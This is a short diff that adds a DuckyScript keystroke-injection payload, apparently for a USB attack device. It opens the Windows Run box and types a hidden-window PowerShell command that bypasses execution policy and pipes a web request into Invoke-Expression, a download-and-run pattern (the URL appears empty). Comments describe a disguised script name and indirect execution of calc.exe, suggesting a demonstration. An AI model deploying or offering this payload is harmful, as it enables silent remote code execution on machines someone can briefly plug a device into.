@@ -1,0 +1,6 @@
+REM executes creation of task via PS
+GUI r
+DEFAULT_DELAY 300
+REM uses ps file called conhost_cmd_sys32.ps1 to start calc.exe via indirect command execution
+STRING powershell -NoP -Ep Bypass -W H -C irm  | iex
+ENTER
